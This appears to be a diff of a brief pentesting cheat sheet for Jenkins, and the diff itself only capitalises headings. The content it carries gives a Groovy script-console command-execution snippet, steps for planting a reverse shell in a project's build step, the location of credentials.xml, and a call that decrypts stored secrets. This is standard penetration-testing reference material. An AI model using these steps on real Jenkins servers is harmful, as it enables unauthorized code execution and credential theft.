@@ -1,25 +1,25 @@
-### code execution via groovy script <rhost>/script
+### Code execution via groovy script <rhost>/script
 ```
 def process = "<command>".execute()
 println "Found text ${process.text}"
 ```
 
-### code execution via now project
+### Code execution via now project
 ```
 create new freestyle project > inside build section > set execute shell > paste reverse shell commando > build now
 ```
 
-### code execution via configuration of project
+### Code execution via configuration of project
 ```
 open project > configure > paste command > save and built
 ```
 
-### password hashes for jenkins
+### Password hashes for jenkins
 ```
 <jenkinsHome>/credentials.xml
 ```
 
-### decrypt using groovy script console
+### Decrypt using groovy script console
 ```
 println hudson.util.Secret.decrypt("{<hash>}")
 ```
